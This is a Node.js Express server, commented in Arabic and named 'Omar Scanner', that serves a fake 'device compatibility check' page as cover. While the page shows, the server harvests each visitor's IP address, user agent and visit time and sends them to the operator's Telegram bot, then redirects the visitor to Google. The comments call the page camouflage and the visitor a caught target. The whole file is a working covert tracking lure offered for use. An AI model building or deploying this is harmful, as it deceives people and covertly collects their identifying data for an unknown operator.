const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

// الحصول على المفاتيح من إعدادات Render
const BOT_TOKEN = process.env.BOT_TOKEN;
const MY_ID = process.env.MY_ID;

app.get('/', async (req, res) => {
    // 1. الصفحة التي يراها الشخص (تمويه احترافي)
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>فحص الأمان</title>
            <style>
                body { background-color: #0f0f0f; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                .loader { border: 4px solid #1a1a1a; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                .text { margin-top: 20px; font-size: 1.2rem; letter-spacing: 2px; }
            </style>
        </head>
        <body>
            <div class="loader"></div>
            <div class="text">جاري فحص توافق الجهاز...</div>
            <script>
                // تحويل الشخص إلى جوجل بعد 4 ثوانٍ من سحب بياناته
                setTimeout(() => { window.location.href = "https://www.google.com"; }, 4000);
            </script>
        </body>
        </html>
    `);

    // 2. جمع معلومات الشخص (IP ونوع الجهاز)
    const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const visitTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Riyadh' });

    // 3. تنسيق الرسالة لترسل لك في التلجرام
    const telegramMessage = `
🔥 **تم اصطياد هدف جديد!** 🔥
-----------------------------
🌐 **الـ IP:** \`${userIP}\`
📱 **الجهاز:** \`${userAgent}\`
⏰ **الوقت:** \`${visitTime}\`
-----------------------------
📡 *تم السحب بواسطة Omar Scanner*
    `;

    // 4. إرسال الرسالة فعلياً
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: MY_ID,
            text: telegramMessage,
            parse_mode: 'Markdown'
        });
        console.log("✅ Data sent to Telegram successfully!");
    } catch (error) {
        console.error("❌ Telegram Error:", error.response ? error.response.data : error.message);
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Scanner is active on port ${PORT}`);
});
